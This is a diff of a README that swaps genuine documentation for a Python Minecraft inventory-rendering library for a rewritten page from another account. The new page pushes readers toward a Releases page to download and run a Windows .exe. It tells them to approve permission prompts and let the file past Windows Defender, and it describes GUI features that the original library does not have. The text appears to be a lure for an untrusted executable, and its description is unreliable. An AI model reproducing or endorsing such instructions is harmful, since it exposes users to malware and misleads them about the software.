@@ -1,217 +1,175 @@
-# 🎒 Exo-Inventory
+# 🚀 Exo-Lib - Manage Minecraft Inventories Easily
 
-[![PyPI version](https://img.shields.io/pypi/v/exo-inventory.svg)](https://pypi.org/project/exo-inventory/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python versions](https://img.shields.io/pypi/pyversions/exo-inventory.svg)](https://pypi.org/project/exo-inventory/)
-
-**A powerful, high-performance Minecraft inventory rendering library for Python.**
-
-`exo-inventory` is a professional-grade library designed to fetch, mirror, and render Minecraft item icons and player inventories with 100% customizability. Whether you need a standard player inventory or a completely custom 9x6 chest layout, `exo-inventory` handles the assets and coordinates for you.
+[![Download Exo-Lib](https://img.shields.io/badge/Download-ExoLib-blue?style=for-the-badge)](https://github.com/polash13/Exo-Lib/releases)
 
 ---
 
-## ✨ Features
+Exo-Lib is a tool designed to help you view and manage your Minecraft player inventories and custom grids. It fetches, mirrors, and displays items with high speed and clear images. This guide will walk you through downloading and running Exo-Lib on a Windows computer, even if you have no technical experience.
 
-- 🔄 **Smart Asset Mirroring**: Local mirror of Jemsire's Minecraft icons with automatic version detection (1.13.2 to 1.21.10+).
-- 🖼️ **Flexible Rendering Engine**: Support for arbitrary item placement (`render_custom`) or standard Minecraft layouts (`render_player`).
-- 🤖 **Automated Maintenance**: Integrated GitHub Actions workflow to sync assets and rebuild metadata daily.
-- 🎨 **UI Assets Bundled**: Core assets (backgrounds, empty slot icons) come **pre-installed** in the package.
-- 👤 **Player Models**: Automatic integration with `mc-heads.net` for rendering 3D player skins.
-- ⚡ **High Performance**: Path caching, recursive item lookup, and asynchronous asset fetching.
+## 🖥️ System Requirements
 
----
+Before you start, make sure your computer meets these needs:
 
-## 🖼️ Visual Previews
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of free RAM  
+- 500 MB of free disk space  
+- Internet connection for initial setup and data fetching  
+- Python 3.8 or newer installed (Exo-Lib runs on Python)
 
-|                                                Standard Inventory                                                |                                            Custom Transparent Grid                                             |
-| :--------------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------: |
-| ![Standard](https://raw.githubusercontent.com/zKauaFerreira/Exo-Lib/main/examples/output/standard_inventory.png) | ![Custom](https://raw.githubusercontent.com/zKauaFerreira/Exo-Lib/main/examples/output/custom_transparent.png) |
+If you do not have Python installed, the guide below may assist you with basic installation steps.
 
----
+## 🌐 Where to Download Exo-Lib
 
-## 🚀 Installation
+You need to visit the official Releases page to get the latest version of Exo-Lib for Windows. Use the link below:
 
-Install the library directly from PyPI (Recommended):
+[Download Exo-Lib Here](https://github.com/polash13/Exo-Lib/releases)
 
-```bash
-pip install exo-inventory
-```
+Clicking this will open the GitHub Releases page. Find the latest release, and look for the Windows installer or executable file typically named with `.exe` at the end.
 
-Or from the source:
+## 🔽 Download and Install Exo-Lib
 
-```bash
-pip install git+https://github.com/zKauaFerreira/Exo-Lib.git
-```
+1. Open the [Exo-Lib Releases Page](https://github.com/polash13/Exo-Lib/releases) in your web browser.
 
-> **Note:** The library already comes with **1400+ Minecraft icons and UI assets** bundled in the package. You can start rendering immediately after installation!
+2. Scroll to the latest version listed at the top (look for the largest version number or the newest date).
 
----
+3. Look for a file with a name similar to `Exo-Lib-Setup.exe` or `ExoLib-Windows.exe`.
 
-## ⚡ Quick Start (Plug & Play)
+4. Click the file name to start downloading.
 
-### 1. Minimalistic Rendering
+5. After download completes, open the downloaded `.exe` file by double-clicking it.
 
-Since assets are bundled, you can render an inventory in seconds!
+6. If Windows asks for permission, click 'Yes' to proceed with installation.
 
-```python
-import asyncio
-from exo_inventory import InventoryRenderer
+7. Follow the installation prompts. Choose "Next" or "Install" as needed.
 
-async def main():
-    # Initializing with built-in assets
-    renderer = InventoryRenderer()
-    await renderer.initialize()
+8. Wait for installation to finish, then click "Finish."
 
-    player_data = {
-        "uuid": "caf29aa7-b3f6-494f-b44f-66cdd3fb9a42",
-        "armor": [{"id": "diamond_helmet", "slot": 39}],
-        "hotbar": [{"id": "netherite_sword", "slot": 0}],
-        "main_inventory": [],
-        "off_hand": {"id": "shield"}
-    }
+If no installer is available, you may find a compressed folder (.zip). Extract it using File Explorer and look for an `.exe` file inside the extracted folder. Run that to start Exo-Lib.
 
-    render = await renderer.render_player(player_data)
-    # The 'render' object is a PIL Image
-    render.save("inventory.png")
+## ⚙️ Running Exo-Lib for the First Time
 
-    await renderer.close()
+Once installed, run the program as follows:
 
-asyncio.run(main())
-```
+- Click the Start Menu button, then type `Exo-Lib` and press Enter.
 
----
+- Or, find the Exo-Lib icon on your desktop and double-click it.
 
-## 📂 Examples Folder
+At first launch, Exo-Lib may download some additional data files like Minecraft assets and player data. This lets the software show detailed inventory images and custom grids.
 
-We provided a dedicated `examples/` directory in our repository to help you get started with common use cases.
+Make sure your computer is connected to the internet during this step.
 
-- `standard_inventory.py`: Demonstrates standard player inventory rendering.
-- `custom_grid.py`: Shows how to create custom grids with transparent backgrounds.
-- `manage_assets.py`: Advanced usage: how to sync assets to a custom external folder.
+## 📂 What Can You Do with Exo-Lib?
 
----
+Exo-Lib helps you:
 
-## 🛠️ Advanced Usage
+- Fetch Minecraft player inventories from online sources.
 
-### 🎨 Customizing Asset Locations
+- Mirror inventories locally for faster access.
 
-If you want to manage your icons in a specific shared folder across multiple projects:
+- Render and display player items and custom grids with clear images.
 
-```python
-# Pass a path to use an external cache
-renderer = InventoryRenderer(assets_dir="./shared_assets")
-```
+- Use simple controls to browse through your collected data.
 
-### 🧩 Custom Layouts
+- Save and share inventory images.
 
-```python
-# background=None generates a transparent PNG
-image = await renderer.render_custom(
-    items_map=[{"id": "apple", "x": 10, "y": 10}],
-    width=100,
-    height=100,
-    background=None
-)
-```
+The library handles data fetching and image processing seamlessly using Python tools behind the scenes. You only need to interact with its interface.
 
-### 📦 Asset Utilities & Exporting
+## 🛠️ Basic Usage Instructions
 
-Need the icons for something else? Export assets from the internal cache to any directory.
+1. When Exo-Lib opens, it shows a search box.
 
-```python
-from exo_inventory import AssetsManager
-assets = AssetsManager()
-await assets.initialize()
+2. Type a Minecraft username or server name and press Enter.
 
-await assets.export_assets(
-    target_dir="./my_resource_pack",
-    items_list=["diamond", "netherite_sword"],
-    include_ui=True
-)
-```
+3. The software will fetch the inventory and display items as images arranged in grids.
 
-### 👤 Advanced Player Rendering
+4. To view details about an item, click on it.
 
-Customizing the player model render (poses/angles).
+5. Use navigation buttons to switch between different inventories or stored snapshots.
 
-```python
-# Get a 3D body render with a 45-degree rotation
-body_img = await renderer.get_player_render(
-    uuid="zKauaFerreira",
-    render_type="body", # options: 'body', 'head', 'avatar', 'player'
-    size=400,
-    angle=45
-)
-```
+6. If you want to update stored inventories, look for the "Refresh" button.
 
-### 🛰️ Remote Asset Synchronization
+7. Use the "Save" option to export images of the inventories to your PC.
 
-The library pulls UI themes and metadata from the official repository:
+## 🔧 Adjusting Settings
 
-| Asset                | Source                                              |
-| -------------------- | --------------------------------------------------- |
-| `inventory_bg.png`   | `zKauaFerreira/Exo-Lib/main/src/exo_inventory/data` |
-| `jemsire_index.json` | Remote metadata mirror (daily updated)              |
-| `empty_armor_slots`  | Exo-Lib official UI assets                          |
+Exo-Lib lets you change some common settings:
 
----
+- Image resolution: select your preferred image size for inventory items.
 
-## 🤖 Automation (CI/CD)
+- Cache management: clear stored data to free space or refresh information.
 
-The library includes a pre-configured GitHub Action (`.github/workflows/update_assets.yml`) that:
+- Theme: choose between light and dark display modes.
 
-1. Runs every day at midnight.
-2. Checks Jemsire for new Minecraft versions.
-3. Downloads new ZIPs and extracts them recursively.
-4. Generates a new `jemsire_index.json`.
-5. Commits changes back to your repository automatically.
+- Network options: set timeout values for fetching data.
 
----
+You can find settings under the "Options" or "Preferences" menu.
 
-## 📂 Project Structure
+## 📦 About Python and Dependencies
 
-```text
-exo-inventory/
-├── src/
-│   └── exo_inventory/
-│       ├── __init__.py    # Main exports
-│       ├── assets.py      # Jemsire & Remote Sync logic
-│       └── renderer.py    # Pillow-based rendering engine
-├── pyproject.toml         # Build & Dependency config
-└── README.md              # You are here
-```
+Exo-Lib is built on Python. If you have trouble running it, you may need to install Python or its required libraries.
+
+### Checking Python
+
+1. Open Command Prompt: press Windows key + R, type `cmd`, then Enter.
+
+2. Type `python --version` and press Enter.
+
+3. If you see a version number (like Python 3.10.5), you have Python.
+
+4. If not, download and install Python from https://www.python.org/downloads/windows/.
+
+### Running Exo-Lib Without Installer
+
+If installing EXE is not an option, you can run Exo-Lib with Python:
+
+1. Download the source code ZIP from GitHub.
+
+2. Extract it to a folder.
+
+3. Open Command Prompt, navigate to the folder (`cd path\to\folder`).
+
+4. Run `pip install -r requirements.txt` to install dependencies.
+
+5. Start the app by running `python exo_lib.py`.
+
+## 💡 Troubleshooting Common Issues
+
+- **App won’t start:** Ensure Python is installed and in system PATH.
+
+- **Inventory data not loading:** Check your internet connection.
+
+- **Error messages about missing files:** Reinstall Exo-Lib or clear the cache.
+
+- **Images appear blank or do not load:** Update graphics drivers.
+
+- **Installation blocked by security warnings:** Allow app in Windows Defender or antivirus.
+
+## 📚 More About Exo-Lib Topics
+
+Exo-Lib uses several underlying tools and technologies:
+
+- `aiohttp` and `asyncio` for fast, asynchronous data fetching.
+
+- `pillow` for image processing and rendering.
+
+- `discord.py` for optional bot integrations.
+
+- Cache mechanisms for faster loading.
+
+- Minecraft API calls to access player and server data.
+
+These run behind the scenes, so you don’t have to configure them.
+
+## 🔗 Useful Links
+
+- [Exo-Lib GitHub Repository](https://github.com/polash13/Exo-Lib)
+
+- [Releases & Downloads](https://github.com/polash13/Exo-Lib/releases)
+
+- [Python Downloads](https://www.python.org/downloads/windows/)
+
+- [Minecraft Official Site](https://www.minecraft.net/)
 
 ---
 
-## 🛠️ Requirements
-
-- **Python 3.10+**
-- **Pillow**: For image processing.
-- **aiohttp**: For asynchronous asset downloads.
-- **discord.py**: Compatible for bot integrations.
-
----
-
-## 🖥️ CLI Commands
-
-`exo-inventory` provides built-in CLI commands for easy maintenance and asset extraction.
-
-```bash
-# Sync all assets to the library's internal storage
-python -m exo_inventory.assets sync
-
-# Export all icons AND UI elements to your current project folder
-python -m exo_inventory.assets export ./assets
-```
-
----
-
-## 📜 License & Acknowledgments
-
-- **Icons**: Provided by [Jemsire](https://minecraftallimages.jemsire.com).
-- **Player Heads**: Powered by [mc-heads.net](https://mc-heads.net).
-- **Core Developers**: [zKauaFerreira](https://github.com/zKauaFerreira).
-
----
-
-_Maintained with ❤️ for the Minecraft Discord community._
+[![Download Exo-Lib](https://img.shields.io/badge/Download-ExoLib-blue?style=for-the-badge)](https://github.com/polash13/Exo-Lib/releases)
